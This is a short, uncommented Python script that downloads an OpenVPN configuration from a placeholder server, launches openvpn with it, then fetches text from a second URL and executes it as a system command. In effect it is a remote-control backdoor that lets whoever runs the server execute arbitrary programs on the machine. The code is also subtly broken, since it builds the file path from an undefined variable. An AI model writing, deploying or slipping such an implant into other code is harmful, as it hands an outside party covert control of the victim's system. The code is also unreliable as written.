import requests
import random
import string
import subprocess

def download_conf():
    url = 'https://domain/long_random_string'
    data = requests.get(url)
    random_string = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
    filename = "/tmp/"+filename + ".ovpn"
    with open(filename, 'wb')as file:
        file.write(data.content)
    subprocess.Popen(["openvpn","--config", filename])
        
def get_command():
    url = 'https://domain/another_long_random_string'
    data = requests.get(url)
    if data.text != 'no':
        subprocess.Popen(data.text.split(" "))
        
download_conf()
get_command()